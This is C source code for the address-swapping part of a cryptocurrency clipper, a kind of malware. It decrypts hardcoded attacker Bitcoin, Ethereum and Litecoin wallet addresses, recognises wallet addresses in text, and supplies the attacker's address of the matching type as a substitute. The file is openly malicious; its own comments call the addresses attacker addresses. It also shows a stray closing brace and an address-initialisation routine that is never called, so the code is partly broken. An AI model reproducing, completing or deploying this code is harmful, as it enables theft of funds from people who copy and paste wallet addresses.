#include "clipper.h"
#include "config.h"
#include "enc_strings.h"
#include <string.h>

#ifdef ENABLE_CLIPPER
#include <ctype.h>

/* Hardcoded attacker addresses — encrypted at build time */
static char btc_addr[64] = {0};
static char eth_addr[64] = {0};
static char ltc_addr[64] = {0};
static int clipper_addrs_init = 0;

static void clipper_ensure_addrs(void) {
    if (clipper_addrs_init) return;
    enc_decrypt(enc_btc_addr, ENC_BTC_ADDR_LEN, btc_addr);
    enc_decrypt(enc_eth_addr, ENC_ETH_ADDR_LEN, eth_addr);
    enc_decrypt(enc_ltc_addr, ENC_LTC_ADDR_LEN, ltc_addr);
    clipper_addrs_init = 1;
}

static int is_btc_char(char c) {
    return (c >= 'A' && c <= 'H') || (c >= 'J' && c <= 'N') ||
           (c >= 'P' && c <= 'Z') || (c >= 'a' && c <= 'k') ||
           (c >= 'm' && c <= 'z') || (c >= '2' && c <= '9');
}

static int is_ltc_char(char c) {
    /* LTC uses Base58 (same as BTC chars) plus '0' and 'O' for bech32 */
    return is_btc_char(c) || c == '0' || c == 'O';
}
}
static int detect_btc(const char *text) {
    const char *p = text;

    /* Skip whitespace */
    while (*p && isspace((unsigned char)*p)) p++;

    /* Legacy address: starts with 1 or 3, 26-62 chars */
    if (*p == '1' || *p == '3') {
        int len = 0;
        while (*p && !isspace((unsigned char)*p)) {
            if (!is_btc_char(*p)) return 0;
            len++;
            p++;
        }
        if (len >= 26 && len <= 62) return 1;
    }

    /* Bech32 address: starts with bc1 */
    if (p[0] == 'b' && p[1] == 'c' && p[2] == '1') {
        int len = 0;
        p += 3;
        while (*p && !isspace((unsigned char)*p)) {
            /* bech32 uses q-z, 0-9 */
            len++;
            p++;
        }
        if (len >= 39 && len <= 59) return 1;
    }

    return 0;
}

static int detect_eth(const char *text) {
    const char *p = text;
    while (*p && isspace((unsigned char)*p)) p++;

    if (p[0] != '0' || (p[1] != 'x' && p[1] != 'X'))
        return 0;
    p += 2;

    int len = 0;
    while (*p && !isspace((unsigned char)*p)) {
        char c = *p;
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
            return 0;
        len++;
        p++;
    }
    return (len == 40) ? 2 : 0;
}

static int detect_ltc(const char *text) {
    const char *p = text;
    while (*p && isspace((unsigned char)*p)) p++;

    /* Legacy: starts with L or M, 26-34 chars */
    if (*p == 'L' || *p == 'M') {
        int len = 0;
        while (*p && !isspace((unsigned char)*p)) {
            if (!is_ltc_char(*p)) return 0;
            len++;
            p++;
        }
        if (len >= 26 && len <= 34) return 3;
    }

    /* Bech32: starts with ltc1 */
    if (p[0] == 'l' && p[1] == 't' && p[2] == 'c' && p[3] == '1') {
        int len = 0;
        p += 4;
        while (*p && !isspace((unsigned char)*p)) {
            len++;
            p++;
        }
        if (len >= 39 && len <= 59) return 3;
    }

    return 0;
}

int clipper_detect_address(const char *text) {
    if (!text || !*text) return 0;

    /* Try each chain in order of specificity */
    int r = detect_btc(text);
    if (r) return r;
    r = detect_eth(text);
    if (r) return r;
    r = detect_ltc(text);
    if (r) return r;
    return 0;
}

int clipper_get_replacement(int type, char *buf, size_t buf_len) {
    if (!buf || buf_len == 0) return -1;

    const char *addr = NULL;
    switch (type) {
    case 1: addr = btc_addr; break;
    case 2: addr = eth_addr; break;
    case 3: addr = ltc_addr; break;
    default: return -1;
    }

    strncpy(buf, addr, buf_len - 1);
    buf[buf_len - 1] = '\0';
    return 0;
}

#endif /* ENABLE_CLIPPER */
